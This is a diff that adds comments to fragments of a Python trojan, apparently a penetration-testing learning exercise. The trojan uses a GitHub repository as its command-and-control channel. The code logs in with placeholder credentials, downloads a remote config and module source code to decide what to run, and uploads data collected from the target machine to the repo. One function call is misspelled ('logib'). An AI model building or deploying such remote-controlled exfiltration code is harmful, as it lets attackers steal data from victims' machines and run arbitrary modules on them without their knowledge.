@@ -19,6 +19,8 @@ configured     = False
 task_queue     = Queue.Queue()
 
 
+# authenticates the user to the repository
+# and retrieves the current repo and branch objects
 def connect_to_github():
     gh   = logib(username = 'yourusername', password = 'yourpassword')
     repo = gh.repository('yourusername', 'python_pen_testing')
@@ -27,6 +29,8 @@ def connect_to_github():
     return gh, repo, branch
 
 
+# grabs file from remote repo and then reads contents locally
+# reads both config options and module cource code
 def get_file_contents(filepath):
     gh, repo, branch = connect_to_github()
     tree = branch.commit.commit.tree.recurse()
@@ -41,6 +45,8 @@ def get_file_contents(filepath):
     return None
 
 
+# Retrieves remote config document from the repo
+# so that trojan knows which modules to run
 def get_trojan_config():
     global configured
     config_json = get_file_contents(trojan_config)
@@ -55,6 +61,7 @@ def get_trojan_config():
     return config
 
 
+# Pushes any collected data from target machine
 def store_module_result():
     gh, repo, branch = connect_to_github()
     remote_path      = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
